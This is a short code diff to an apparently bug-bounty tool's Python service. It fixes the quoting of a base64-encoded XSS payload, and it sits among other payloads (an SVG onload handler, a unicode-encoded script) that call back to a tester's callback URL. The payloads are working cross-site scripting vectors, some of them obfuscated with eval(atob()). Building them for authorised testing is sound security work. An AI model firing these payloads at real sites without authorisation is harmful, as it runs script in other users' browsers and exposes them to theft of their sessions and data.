@@ -216,7 +216,8 @@ class BugBountyService:
         payloads["svg"] = f'<svg onload="fetch(\'{callback_url}?xss=svg{id_part}\')">'
         
         # Encoded variants
-        payloads["base64"] = f'<script>eval(atob("{self._base64_encode(f"fetch('{callback_url}?xss=b64{id_part}')")}")</script>'
+        encoded_fetch = f"fetch('{callback_url}?xss=b64{id_part}')"
+        payloads["base64"] = f'<script>eval(atob("{self._base64_encode(encoded_fetch)}"))</script>'
         payloads["unicode"] = self._unicode_encode(f'<script>fetch("{callback_url}?xss=uni{id_part}")</script>')
         
         return ToolResult(
